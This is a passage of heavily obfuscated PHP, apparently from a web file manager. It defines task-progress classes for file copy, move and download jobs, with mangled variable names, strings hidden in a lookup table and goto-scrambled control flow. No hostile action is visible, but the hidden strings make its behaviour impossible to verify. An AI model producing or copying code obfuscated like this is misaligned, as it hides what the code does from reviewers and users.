$_SERVER[ºÖÙÂŒäÉê‡]; $D‚ºŸÙñá­ = Model($C„ê™ìà¯ˆ[1401])->cacheKey($C„ê™ìà¯ˆ[1400]); Cache::clearMemory($D‚ºŸÙñá­); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\151\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($c¢‘ñŸÖİÍ, $Eö®ŞŸŞ×í = '', $dù¾¤äø = 0, $BŞ¯ÙÇÉ– = '') { goto fØ¼ÄïœĞù; a›òèÙÀìâ: Hook::bind($eÏ‰‡ŠÍÙ[1369], array($this, $eÏ‰‡ŠÍÙ[1411])); Hook::bind($eÏ‰‡ŠÍÙ[1412], array($this, $eÏ‰‡ŠÍÙ[1413])); $this->startAfter(); goto a·œÉÂ‘á‰; a·œÉÂ‘á‰: Hook::trigger($eÏ‰‡ŠÍÙ[1414], $this->task); $this->task[$eÏ‰‡ŠÍÙ[1408]] = timeFloat(); self::valueSet($this->task[$eÏ‰‡ŠÍÙ[372]], $this->task); goto d±’’ìÎíù; fØ¼ÄïœĞù: $eÏ‰‡ŠÍÙ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (self::get($c¢‘ñŸÖİÍ)) { return; } $this->task = array($eÏ‰‡ŠÍÙ[372] => $c¢‘ñŸÖİÍ, $eÏ‰‡ŠÍÙ[1403] => USER_ID, $eÏ‰‡ŠÍÙ[1309] => $BŞ¯ÙÇÉ–, $eÏ‰‡ŠÍÙ[29] => $Eö®ŞŸŞ×í, $eÏ‰‡ŠÍÙ[970] => $eÏ‰‡ŠÍÙ[33], $eÏ‰‡ŠÍÙ[968] => $dù¾¤äø, $eÏ‰‡ŠÍÙ[980] => 0, $eÏ‰‡ŠÍÙ[1404] => 0, $eÏ‰‡ŠÍÙ[1405] => 0, $eÏ‰‡ŠÍÙ[1406] => timeFloat(), $eÏ‰‡ŠÍÙ[1407] => 0, $eÏ‰‡ŠÍÙ[1408] => 0, $eÏ‰‡ŠÍÙ[1409] => 0, $eÏ‰‡ŠÍÙ[1410] => 0, $eÏ‰‡ŠÍÙ[686] => $eÏ‰‡ŠÍÙ[1367]); goto a›òèÙÀìâ; d±’’ìÎíù: } public function end() { goto CØô¢ÓğŞ; F¹èŞéÄ±†: $A‰ëªêˆâ = timeFloat() - $this->task[$fé»ªšƒŸ³[1406]]; self::log($fé»ªšƒŸ³[1415] . $this->task[$fé»ªšƒŸ³[372]] . $fé»ªšƒŸ³[1416] . $A‰ëªêˆâ . $fé»ªšƒŸ³[1417]); Hook::unbind($fé»ªšƒŸ³[1369], array($this, $fé»ªšƒŸ³[1411])); goto cêç¬¥¸Ó; cêç¬¥¸Ó: Hook::unbind($fé»ªšƒŸ³[1412], array($this, $fé»ªšƒŸ³[1413])); $this->endAfter(); $this->task = !1; goto F„Å¨’ÚÄË; CØô¢ÓğŞ: $fé»ªšƒŸ³ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->task) { return; } if ($this->task[$fé»ªšƒŸ³[1408]]) { self::valueSet($this->task[$fé»ªšƒŸ³[372]], !1); } goto F¹èŞéÄ±†; F„Å¨’ÚÄË: } public function update($d—…ËÜÕ¯ = 0) { goto C°õõ† ƒŠ; F×°‘½Ç¸¿: $d¿›ÙÍÃó = self::get($B¤æ”Ÿ Ñ[$fÅÍŒâší†[372]]); $b—“¯¿ø = $d¿›ÙÍÃó[$fÅÍŒâší†[686]]; if ($b—“¯¿ø == self::STATYS_KILL) { $e†ä‡“Ûá = array($fÅÍŒâší†[1418] => LNG($fÅÍŒâší†[1419]), $fÅÍŒâší†[1022] => !1); Cache::set($fÅÍŒâší†[1420] . $this->task[$fÅÍŒâší†[372]], $e†ä‡“Ûá, 30); $this->end(); die; } else { if ($b—“¯¿ø == self::STATYS_STOP) { $a§ÔªåÚÓ = 2; $d¿›ÙÍÃó[$fÅÍŒâší†[1409]] += $a§ÔªåÚÓ; self::valueSet($B¤æ”Ÿ Ñ[$fÅÍŒâší†[372]], $d¿›ÙÍÃó); sleep($a§ÔªåÚÓ); $this->update(); return; } } goto DõÙ²Óß¡; dŸÙàìŞ¶: $this->updateAfter(); $bŸÙÚğÛæ¼ = 0.2; if (timeFloat() - $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1408]] < $bŸÙÚğÛæ¼) { return; } goto F×°‘½Ç¸¿; C°õõ† ƒŠ: $fÅÍŒâší† =& $_SERVER[ºÖÙÂŒäÉê‡]; $B¤æ”Ÿ Ñ =& $this->task; if (!$B¤æ”Ÿ Ñ) { return; } goto cƒÚ†îÆî; cƒÚ†îÆî: $B¤æ”Ÿ Ñ[$fÅÍŒâší†[980]] += $d—…ËÜÕ¯; $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1407]] = timeFloat(); if ($B¤æ”Ÿ Ñ[$fÅÍŒâší†[968]]) { if ($B¤æ”Ÿ Ñ[$fÅÍŒâší†[968]] < $B¤æ”Ÿ Ñ[$fÅÍŒâší†[980]]) { $B¤æ”Ÿ Ñ[$fÅÍŒâší†[968]] = $B¤æ”Ÿ Ñ[$fÅÍŒâší†[980]]; } $aœó‚Š¤å® = timeFloat() - $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1406]] - $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1409]]; $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1404]] = $B¤æ”Ÿ Ñ[$fÅÍŒâší†[980]] / $B¤æ”Ÿ Ñ[$fÅÍŒâší†[968]]; $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1405]] = $B¤æ”Ÿ Ñ[$fÅÍŒâší†[980]] / $aœó‚Š¤å®; if ($B¤æ”Ÿ Ñ[$fÅÍŒâší†[1404]] > 0) { $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1410]] = $aœó‚Š¤å® * (1 - $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1404]]) / $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1404]]; } $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1410]] = $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1410]] <= 0 ? 0 : $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1410]]; } goto dŸÙàìŞ¶; F¯ù´áä ˜: Hook::trigger($fÅÍŒâší†[1421], $B¤æ”Ÿ Ñ); self::valueSet($B¤æ”Ÿ Ñ[$fÅÍŒâší†[372]], $B¤æ”Ÿ Ñ); goto e„âÈôõñ©; DõÙ²Óß¡: $B¤æ”Ÿ Ñ[$fÅÍŒâší†[686]] = $b—“¯¿ø ? $b—“¯¿ø : $B¤æ”Ÿ Ñ[$fÅÍŒâší†[686]]; $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1409]] = $d¿›ÙÍÃó[$fÅÍŒâší†[1409]] ? $d¿›ÙÍÃó[$fÅÍŒâší†[1409]] : 0; $B¤æ”Ÿ Ñ[$fÅÍŒâší†[1408]] = timeFloat(); goto F¯ù´áä ˜; e„âÈôõñ©: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($C¶–ê•ÕÅë) { $DÀÏğ“óƒ¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; Cache::set($DÀÏğ“óƒ¤[1420] . $this->task[$DÀÏğ“óƒ¤[372]], $C¶–ê•ÕÅë, 60); return $C¶–ê•ÕÅë; } public static function get($E®±³¬ƒØØ) { return self::valueGet($E®±³¬ƒØØ); } public static function listData() { $D×ÈÖ¬ˆ¹² = self::valueGet(); return array_sort_by($D×ÈÖ¬ˆ¹², $_SERVER[ºÖÙÂŒäÉê‡][1406], !0); } public static function kill($D‘˜¾óÓÄ) { return self::changeStatus($D‘˜¾óÓÄ, self::STATYS_KILL); } public static function stop($aŒ‚ò¥Í’­) { return self::changeStatus($aŒ‚ò¥Í’­, self::STATYS_STOP); } public static function restart($B–ñ–“Òœ) { return self::changeStatus($B–ñ–“Òœ, self::STATYS_RUNNING); } public static function killAll() { $få”ØØÙÀŒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D¸Á©ßËÊ— = self::listData(); foreach ($D¸Á©ßËÊ— as $b–±ïŞÖŠ) { self::kill($b–±ïŞÖŠ[$få”ØØÙÀŒ[372]]); } sleep(2); foreach ($D¸Á©ßËÊ— as $b–±ïŞÖŠ) { self::valueSet($b–±ïŞÖŠ[$få”ØØÙÀŒ[372]], !1); } } private static function changeStatus($bó›Ø·æ‡, $EôÏŠ¢î·) { goto Eëšã´Ñ¼­; C¯Å®µáÑì: $A©Ü„œÑù[$cÄ‰ã´¤‹æ[686]] = $EôÏŠ¢î·; self::valueSet($bó›Ø·æ‡, $A©Ü„œÑù); self::log($cÄ‰ã´¤‹æ[1422] . $A©Ü„œÑù[$cÄ‰ã´¤‹æ[372]] . $cÄ‰ã´¤‹æ[1423] . $EôÏŠ¢î·); goto C¤±ìÓŒ”Å; C¤±ìÓŒ”Å: return !0; goto Fõ¹•º©‹È; Eëšã´Ñ¼­: $cÄ‰ã´¤‹æ =& $_SERVER[ºÖÙÂŒäÉê‡]; $A©Ü„œÑù = self::valueGet($bó›Ø·æ‡); if (!$A©Ü„œÑù) { return !1; } goto C¯Å®µáÑì; Fõ¹•º©‹È: } public static function valueGet($C¯‹‹âí–Ä = false) { $cØÅÒÛëÁÎ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($C¯‹‹âí–Ä) { $dáñËùáÜî = Model($cØÅÒÛëÁÎ[403])->where(array($cØÅÒÛëÁÎ[89] => $C¯‹‹âí–Ä, $cØÅÒÛëÁÎ[29] => $cØÅÒÛëÁÎ[1424]))->find(); return $dáñËùáÜî ? json_decode($dáñËùáÜî[$cØÅÒÛëÁÎ[364]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($f†ŠöÇ«“â = false) { goto EŸõÛ…ä‘™; FÔ…‡½Ìá»: return $Bº¤®½¦ª; goto aœÊ†¤šê; Cìë³³…: $Bº¤®½¦ª = Model($C‡Çíõ¬Ÿó[403])->where($C‰‡¹å£¼´)->select(); $Bº¤®½¦ª = $Bº¤®½¦ª ? $Bº¤®½¦ª : array(); foreach ($Bº¤®½¦ª as $BñÖÒ³œÄ÷ => $FĞÛ–Ö’Î×) { $Bº¤®½¦ª[$BñÖÒ³œÄ÷] = json_decode($FĞÛ–Ö’Î×[$C‡Çíõ¬Ÿó[364]], !0); } goto FÔ…‡½Ìá»; EŸõÛ…ä‘™: $C‡Çíõ¬Ÿó =& $_SERVER[ºÖÙÂŒäÉê‡]; $C‰‡¹å£¼´ = array($C‡Çíõ¬Ÿó[29] => $C‡Çíõ¬Ÿó[1424]); if ($f†ŠöÇ«“â) { $C‰‡¹å£¼´[$C‡Çíõ¬Ÿó[1403]] = $f†ŠöÇ«“â; } goto Cìë³³…; aœÊ†¤šê: } public static function valueSet($BäŠÓŸÄ, $Aä’¶Ùà´) { goto DçáÎ³Ù©¼; DçáÎ³Ù©¼: $dš¸Ñ†ŒÔ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$Aä’¶Ùà´) { return Model($dš¸Ñ†ŒÔ[403])->where(array($dš¸Ñ†ŒÔ[89] => $BäŠÓŸÄ, $dš¸Ñ†ŒÔ[29] => $dš¸Ñ†ŒÔ[1424]))->delete(); } $B´ÇÕ˜° = json_encode($Aä’¶Ùà´); goto cœ“Ğ•õ¦¿; D’¦Ù¢¬ùé: Model($dš¸Ñ†ŒÔ[403])->add($A¶´ù¬¦¸, array(), !0); goto bƒ‹å‹Òèí; cœ“Ğ•õ¦¿: if (!$B´ÇÕ˜°) { ob_start(); var_dump($Aä’¶Ùà´); $Aë—˜÷î¼Ô = ob_get_clean(); self::log($dš¸Ñ†ŒÔ[1425] . json_encode_force($Aë—˜÷î¼Ô)); } if (!$BäŠÓŸÄ || !$Aä’¶Ùà´[$dš¸Ñ†ŒÔ[372]]) { return !1; } $A¶´ù¬¦¸ = array($dš¸Ñ†ŒÔ[29] => $dš¸Ñ†ŒÔ[1424], $dš¸Ñ†ŒÔ[1403] => USER_ID, $dš¸Ñ†ŒÔ[89] => $BäŠÓŸÄ, $dš¸Ñ†ŒÔ[364] => $B´ÇÕ˜°); goto D’¦Ù¢¬ùé; bƒ‹å‹Òèí: } public static function log($dŞĞĞ¥²ò‘) { write_log($dŞĞĞ¥²ò‘, $_SERVER[ºÖÙÂŒäÉê‡][1426]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto c¦•ÔñÎ³; føšÃó™: Hook::bind($AÁĞ—”ôÕË[515], array($this, $AÁĞ—”ôÕË[1436])); Hook::bind($AÁĞ—”ôÕË[517], array($this, $AÁĞ—”ôÕË[1436])); Hook::bind($AÁĞ—”ôÕË[519], array($this, $AÁĞ—”ôÕË[1436])); goto bÕ¥•¡³–; Cœğ²›áª³: if (!$FÓàªÜ[$AÁĞ—”ôÕË[1309]]) { $FÓàªÜ[$AÁĞ—”ôÕË[1309]] = LNG($AÁĞ—”ôÕË[1452]); } goto D“Òº©¢ñ; FÜ¹ÌÃğŠµ: $FÓàªÜ[$AÁĞ—”ôÕË[970]] = $AÁĞ—”ôÕË[33]; $FÓàªÜ[$AÁĞ—”ôÕË[1450]] = $AÁĞ—”ôÕË[33]; $FÓàªÜ[$AÁĞ—”ôÕË[1451]] = 0; goto Cœğ²›áª³; DÁó«¦“ÛÄ: $FÓàªÜ[$AÁĞ—”ôÕË[1446]] = LNG($AÁĞ—”ôÕË[1447]); $FÓàªÜ[$AÁĞ—”ôÕË[1448]] = 0; $FÓàªÜ[$AÁĞ—”ôÕË[1449]] = 0; goto FÜ¹ÌÃğŠµ; e××”¢†È¤: Hook::bind($AÁĞ—”ôÕË[543], array($this, $AÁĞ—”ôÕË[1433])); Hook::bind($AÁĞ—”ôÕË[544], array($this, $AÁĞ—”ôÕË[1434])); Hook::bind($AÁĞ—”ôÕË[546], array($this, $AÁĞ—”ôÕË[1435])); goto cÒÄĞà¼“; e¶¥ÀÒ«õÈ: Hook::bind($AÁĞ—”ôÕË[1427], array($this, $AÁĞ—”ôÕË[1428])); Hook::bind($AÁĞ—”ôÕË[1429], array($this, $AÁĞ—”ôÕË[1430])); Hook::bind($AÁĞ—”ôÕË[1431], array($this, $AÁĞ—”ôÕË[1432])); goto e××”¢†È¤; E×³Ã¯¦ç: Hook::bind($AÁĞ—”ôÕË[1440], array($this, $AÁĞ—”ôÕË[1441])); Hook::bind($AÁĞ—”ôÕË[1442], array($this, $AÁĞ—”ôÕË[1443])); Hook::bind($AÁĞ—”ôÕË[1444], array($this, $AÁĞ—”ôÕË[1445])); goto DÁó«¦“ÛÄ; cÒÄĞà¼“: Hook::bind($AÁĞ—”ôÕË[547], array($this, $AÁĞ—”ôÕË[1435])); Hook::bind($AÁĞ—”ôÕË[513], array($this, $AÁĞ—”ôÕË[1436])); Hook::bind($AÁĞ—”ôÕË[510], array($this, $AÁĞ—”ôÕË[1436])); goto føšÃó™; bÕ¥•¡³–: Hook::bind($AÁĞ—”ôÕË[1437], array($this, $AÁĞ—”ôÕË[1438])); Hook::bind($AÁĞ—”ôÕË[536], array($this, $AÁĞ—”ôÕË[1439])); $this->sourceModelCopyFlag = !1; goto E×³Ã¯¦ç; c¦•ÔñÎ³: $AÁĞ—”ôÕË =& $_SERVER[ºÖÙÂŒäÉê‡]; $FÓàªÜ =& $this->task; $this->sourceCopyFolder = !1; goto e¶¥ÀÒ«õÈ; D“Òº©¢ñ: } protected function endAfter() { goto d‘š İå——; A„ß²ôÃ‘¦: Hook::unbind($EÄ†‘µ‚¥Ë[1431], array($this, $EÄ†‘µ‚¥Ë[1432])); Hook::unbind($EÄ†‘µ‚¥Ë[543], array($this, $EÄ†‘µ‚¥Ë[1433])); Hook::unbind($EÄ†‘µ‚¥Ë[544], array($this, $EÄ†‘µ‚¥Ë[1434])); goto bÚ„ëè˜±İ; bíùó²Ì“: Hook::unbind($EÄ†‘µ‚¥Ë[1440], array($this, $EÄ†‘µ‚¥Ë[1441])); Hook::unbind($EÄ†‘µ‚¥Ë[1442], array($this, $EÄ†‘µ‚¥Ë[1443])); Hook::unbind($EÄ†‘µ‚¥Ë[1444], array($this, $EÄ†‘µ‚¥Ë[1445])); goto bèÚŒÄòµ¼; bÚ„ëè˜±İ: Hook::unbind($EÄ†‘µ‚¥Ë[546], array($this, $EÄ†‘µ‚¥Ë[1435])); Hook::unbind($EÄ†‘µ‚¥Ë[547], array($this, $EÄ†‘µ‚¥Ë[1435])); Hook::unbind($EÄ†‘µ‚¥Ë[513], array($this, $EÄ†‘µ‚¥Ë[1436])); goto C“œË•…¼’; Aõ‰×»Ø·: Hook::unbind($EÄ†‘µ‚¥Ë[519], array($this, $EÄ†‘µ‚¥Ë[1436])); Hook::unbind($EÄ†‘µ‚¥Ë[1437], array($this, $EÄ†‘µ‚¥Ë[1438])); Hook::unbind($EÄ†‘µ‚¥Ë[536], array($this, $EÄ†‘µ‚¥Ë[1439])); goto bíùó²Ì“; d‘š İå——: $EÄ†‘µ‚¥Ë =& $_SERVER[ºÖÙÂŒäÉê‡]; Hook::unbind($EÄ†‘µ‚¥Ë[1427], array($this, $EÄ†‘µ‚¥Ë[1428])); Hook::unbind($EÄ†‘µ‚¥Ë[1429], array($this, $EÄ†‘µ‚¥Ë[1430])); goto A„ß²ôÃ‘¦; C“œË•…¼’: Hook::unbind($EÄ†‘µ‚¥Ë[510], array($this, $EÄ†‘µ‚¥Ë[1436])); Hook::unbind($EÄ†‘µ‚¥Ë[515], array($this, $EÄ†‘µ‚¥Ë[1436])); Hook::unbind($EÄ†‘µ‚¥Ë[517], array($this, $EÄ†‘µ‚¥Ë[1436])); goto Aõ‰×»Ø·; bèÚŒÄòµ¼: } public function copyMoveStart($ağ˜ƒñÙèŠ, $bî†«ó¨î, $CÆ¹®§›î™, $D‚„ˆªÜİ) { } public function updateAfter() { goto F˜¸Í‰§İà; F˜¸Í‰§İà: $f²­—ã÷®á =& $_SERVER[ºÖÙÂŒäÉê‡]; $B®„½Ô¯— =& $this->task; if (!$B®„½Ô¯—[$f²­—ã÷®á[695]]) { return; } goto bÄ…İÕá˜‘; DÆ×²ì¯ğÁ: $B®„½Ô¯—[$f²­—ã÷®á[1404]] = ($B®„½Ô¯—[$f²­—ã÷®á[1453]] + $FëóÎè‚Íî) / $B®„½Ô¯—[$f²­—ã÷®á[695]]; if ($B®„½Ô¯—[$f²­—ã÷®á[1404]] > 0) { $BãŒ‹…³§é = timeFloat() - $B®„½Ô¯—[$f²­—ã÷®á[1406]] - $B®„½Ô¯—[$f²­—ã÷®á[1409]]; $B®„½Ô¯—[$f²­—ã÷®á[1410]] = $BãŒ‹…³§é * (1 - $B®„½Ô¯—[$f²­—ã÷®á[1404]]) / $B®„½Ô¯—[$f²­—ã÷®á[1404]]; } goto AŒË¨Æó‚é; bÄ…İÕá˜‘: if ($this->sourceModelCopyFlag) { return; } $FëóÎè‚Íî = 0; if ($B®„½Ô¯—[$f²­—ã÷®á[1450]] == $f²­—ã÷®á[1030]) { $FëóÎè‚Íî = $B®„½Ô¯—[$f²­—ã÷®á[1449]] * 0.5; } else { if ($B®„½Ô¯—[$f²­—ã÷®á[1450]] == $f²­—ã÷®á[102]) { $FëóÎè‚Íî = $B®„½Ô¯—[$f²­—ã÷®á[1449]] * 0.5 + $B®„½Ô¯—[$f²­—ã÷®á[1448]] * 0.5; } } goto DÆ×²ì¯ğÁ; AŒË¨Æó‚é: } public function addPath($b‚ó„ İ‘ñ) { goto C±ß·å®–ã; c”…È„ä…: $c¨¼ÇÆ¯« = IO::infoWithChildren($b‚ó„ İ‘ñ); $dÛ‘áŒ²‰¡ = $AËµÆô®ìÚ[$b°ƒ‚Ş˜Ù[1454]] ? $AËµÆô®ìÚ[$b°ƒ‚Ş˜Ù[1454]][$b°ƒ‚Ş˜Ù[1455]] : 0; $AËµÆô®ìÚ[$b°ƒ‚Ş˜Ù[1454]] = array($b°ƒ‚Ş˜Ù[1455] => $dÛ‘áŒ²‰¡ + 1, $b°ƒ‚Ş˜Ù[391] => $c¨¼ÇÆ¯«[$b°ƒ‚Ş˜Ù[28]], $b°ƒ‚Ş˜Ù[75] => $c¨¼ÇÆ¯«[$b°ƒ‚Ş˜Ù[75]], $b°ƒ‚Ş˜Ù[470] => $c¨¼ÇÆ¯«[$b°ƒ‚Ş˜Ù[470]] ? $c¨¼ÇÆ¯«[$b°ƒ‚Ş˜Ù[470]] : $c¨¼ÇÆ¯«[$b°ƒ‚Ş˜Ù[75]]); goto E¿‡™ôì„Ñ; C±ß·å®–ã: $b°ƒ‚Ş˜Ù =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$b‚ó„ İ‘ñ) { return; } $AËµÆô®ìÚ =& $this->task; goto c”…È„ä…; E¿‡™ôì„Ñ: if ($c¨¼ÇÆ¯«[$b°ƒ‚Ş˜Ù[29]] == $b°ƒ‚Ş˜Ù[163]) { $AËµÆô®ìÚ[$b°ƒ‚Ş˜Ù[968]] += 1; } else { $AËµÆô®ìÚ[$b°ƒ‚Ş˜Ù[968]] += $c¨¼ÇÆ¯«[$b°ƒ‚Ş˜Ù[80]][$b°ƒ‚Ş˜Ù[78]]; if ($c¨¼ÇÆ¯«[$b°ƒ‚Ş˜Ù[374]]) { $AËµÆô®ìÚ[$b°ƒ‚Ş˜Ù[968]] += $c¨¼ÇÆ¯«[$b°ƒ‚Ş˜Ù[80]][$b°ƒ‚Ş˜Ù[79]] + 1; } } $AËµÆô®ìÚ[$b°ƒ‚Ş˜Ù[695]] += $c¨¼ÇÆ¯«[$b°ƒ‚Ş˜Ù[77]]; $this->update(); goto aì¼Çé¹…Œ; aì¼Çé¹…Œ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($CŠ©÷Û³ïç) { $e‰«µŒöî¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fâ‹Í¡´½í =& $this->task; $fâ‹Í¡´½í[$e‰«µŒöî¨[1446]] = $CŠ©÷Û³ïç[$e‰«µŒöî¨[28]]; $fâ‹Í¡´½í[$e‰«µŒöî¨[970]] = $CŠ©÷Û³ïç[$e‰«µŒöî¨[28]]; $this->update(); } public function copyFileStart($f”­Ã“¨ó, $f ©Ñˆ‘Ş…, $fİ¡„Ê‡¨›, $dš¢´¸œÂ„, $b‹Ç¸ğš’¡, $f•¬¡Ù³Öæ) { goto E¹½…ƒ£›¯; EŒğÑ‡ğ¥: $dãà—ª—°[$e“æğ³¿ä[1446]] = $bö×”…Ä¯­; $dãà—ª—°[$e“æğ³¿ä[1448]] = (int) $f”­Ã“¨ó->size($f ©Ñˆ‘Ş…); $dãà—ª—°[$e“æğ³¿ä[1449]] = 0; goto c‚·İÉ§©¯; c‚·İÉ§©¯: $dãà—ª—°[$e“æğ³¿ä[970]] = $e“æğ³¿ä[33]; $dãà—ª—°[$e“æğ³¿ä[1450]] = $e“æğ³¿ä[33]; $dãà—ª—°[$e“æğ³¿ä[1451]] = 0; goto C„ãÏ‹µâ; C„ãÏ‹µâ: $this->update(); goto CøŒĞªÜó¨; E¹½…ƒ£›¯: $e“æğ³¿ä =& $_SERVER[ºÖÙÂŒäÉê‡]; $bö×”…Ä¯­ = $b‹Ç¸ğš’¡; if ($bö×”…Ä¯­ == $GLOBALS[$e“æğ³¿ä[1456]]) { $bö×”…Ä¯­ = $GLOBALS[$e“æğ³¿ä[1457]]; } goto D¦ğåçø—×; D¦ğåçø—×: $GLOBALS[$e“æğ³¿ä[1457]] = $b‹Ç¸ğš’¡; $GLOBALS[$e“æğ³¿ä[1456]] = $f•¬¡Ù³Öæ; $dãà—ª—° =& $this->task; goto EŒğÑ‡ğ¥; CøŒĞªÜó¨: } public function copyFileEnd($d†ÊÇ¨×“², $E¬×ç¥ÚÇ…, $f ïãÕ—, $fğ¡İôİ‹š, $a÷Û¼õÛ’, $A©¡÷°ö©) { $fåÃ‚‰œ“‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; $c‚§À‡‡† =& $this->task; $c‚§À‡‡†[$fåÃ‚‰œ“‰[1449]] = $c‚§À‡‡†[$fåÃ‚‰œ“‰[1448]]; $c‚§À‡‡†[$fåÃ‚‰œ“‰[1450]] = $fåÃ‚‰œ“‰[33]; if ($a÷Û¼õÛ’ == $c‚§À‡‡†[$fåÃ‚‰œ“‰[1446]]) { $c‚§À‡‡†[$fåÃ‚‰œ“‰[1453]] += $c‚§À‡‡†[$fåÃ‚‰œ“‰[1448]]; $this->update(1); } else { $this->update(); $c‚§À‡‡†[$fåÃ‚‰œ“‰[1449]] = 0; } self::log($fåÃ‚‰œ“‰[1458] . $E¬×ç¥ÚÇ… . $fåÃ‚‰œ“‰[66] . $fğ¡İôİ‹š . $fåÃ‚‰œ“‰[174] . $a÷Û¼õÛ’ . $fåÃ‚‰œ“‰[1459] . $c‚§À‡‡†[$fåÃ‚‰œ“‰[1446]]); } public function updateFileEnd($B÷»ğÃö®á, $eãöŸ ÕÁŠ) { $D¶ŠŞäğ  =& $_SERVER[ºÖÙÂŒäÉê‡]; $cù×”×¨‘“ =& $this->task; $cù×”×¨‘“[$D¶ŠŞäğ [1446]] = $B÷»ğÃö®á; $cù×”×¨‘“[$D¶ŠŞäğ [1448]] = $eãöŸ ÕÁŠ; $cù×”×¨‘“[$D¶ŠŞäğ [1453]] += $eãöŸ ÕÁŠ; $this->update(1); } public function sourceModelCopy($dñÁÌ†Ùè) { goto EÄ¯¤ÇàŒ; EÄ¯¤ÇàŒ: $B´ ‹õå =& $_SERVER[ºÖÙÂŒäÉê‡]; $F¥²İ³ÎÑ = $dñÁÌ†Ùè[0]; $aÔ—­ÁŠÁ = $dñÁÌ†Ùè[1]; goto fÑİ¡ø¢Ì´; fÑİ¡ø¢Ì´: $Dï›º ŠšÈ =& $this->task; $this->sourceModelCopyFlag = !0; $D‹–›†ùøµ = 0; goto d’Ù‚·Êô¯; d’Ù‚·Êô¯: switch ($F¥²İ³ÎÑ) { case $B´ ‹õå[511]: $D‹–›†ùøµ = 1; break; case $B´ ‹õå[514]: $Dï›º ŠšÈ[$B´ ‹õå[1446]] = $aÔ—­ÁŠÁ[$B´ ‹õå[28]]; break; case $B´ ‹õå[516]: $D‹–›†ùøµ = intval($dñÁÌ†Ùè[$B´ ‹õå[368]] * 0.4); break; case $B´ ‹õå[518]: $D‹–›†ùøµ = intval($dñÁÌ†Ùè[$B´ ‹õå[368]] * 0.2); break; case $B´ ‹õå[520]: $D‹–›†ùøµ = intval($dñÁÌ†Ùè[$B´ ‹õå[368]] * 0.4); break; } $this->update($D‹–›†ùøµ); $this->sourceModelCopyFlag = !1; goto eÑ©„†¹Ü; eÑ©„†¹Ü: } public function sourceRemove($Eœğñ®Â£, $e‡„ñÖ¢›Ë) { $B¸ù×Ë•Ñø =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->sourceModelCopyFlag = !0; $BÜÂ•¼¯‡÷ = 1; if (isset($Eœğñ®Â£[$B¸ù×Ë•Ñø[80]])) { $BÜÂ•¼¯‡÷ = $Eœğñ®Â£[$B¸ù×Ë•Ñø[80]][$B¸ù×Ë•Ñø[78]] + $Eœğñ®Â£[$B¸ù×Ë•Ñø[80]][$B¸ù×Ë•Ñø[79]] + 1; } $this->update($BÜÂ•¼¯‡÷); $this->sourceModelCopyFlag = !1; } public function sourceMove($aîâÂÏËÉß) { $this->sourceRemove($aîâÂÏËÉß, !1); } public function curlProgress($FƒîäÇ†å™, $c¦Ó‰½÷µ˜, $bøƒù‹ËéË, $FÉÅò«Õ‡ñ, $Fùœ¦Ôº™ˆ) { $d‰–µøåˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fó¬ƒ„Ø‹õ =& $this->task; if ($Fùœ¦Ôº™ˆ > 0) { $fó¬ƒ„Ø‹õ[$d‰–µøåˆ[970]] = $d‰–µøåˆ[1460]; $fó¬ƒ„Ø‹õ[$d‰–µøåˆ[1450]] = $d‰–µøåˆ[102]; if ($fó¬ƒ„Ø‹õ[$d‰–µøåˆ[1448]] == $FÉÅò«Õ‡ñ || $FÉÅò«Õ‡ñ > 1024 * 1024) { $fó¬ƒ„Ø‹õ[$d‰–µøåˆ[1449]] = $Fùœ¦Ôº™ˆ; } if ($fó¬ƒ„Ø‹õ[$d‰–µøåˆ[1451]]) { $fó¬ƒ„Ø‹õ[$d‰–µøåˆ[1449]] = $Fùœ¦Ôº™ˆ + $fó¬ƒ„Ø‹õ[$d‰–µøåˆ[1451]]; } } else { if ($bøƒù‹ËéË > 0) { if ($fó¬ƒ„Ø‹õ[$d‰–µøåˆ[1448]] == $c¦Ó‰½÷µ˜) { $fó¬ƒ„Ø‹õ[$d‰–µøåˆ[1449]] = $bøƒù‹ËéË; $fó¬ƒ„Ø‹õ[$d‰–µøåˆ[970]] = $d‰–µøåˆ[1461]; $fó¬ƒ„Ø‹õ[$d‰–µøåˆ[1450]] = $d‰–µøåˆ[1030]; } } } $this->update(); } public function curlProgressStart($f‹¼ÜÑ ) { } public function curlProgressEnd($F©ÛÖ‡»âØ) { $B˜à¥Ùî†Ş =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cã­°¨ƒ‹İ =& $this->task; $fËç‰ƒŒ™¼ = curl_getinfo($F©ÛÖ‡»âØ); $A‰®ášºµ± = $fËç‰ƒŒ™¼[$B˜à¥Ùî†Ş[1462]]; if ($Cã­°¨ƒ‹İ[$B˜à¥Ùî†Ş[1450]] == $B˜à¥Ùî†Ş[102] && $A‰®ášºµ±) { $Cã­°¨ƒ‹İ[$B˜à¥Ùî†Ş[1451]] += 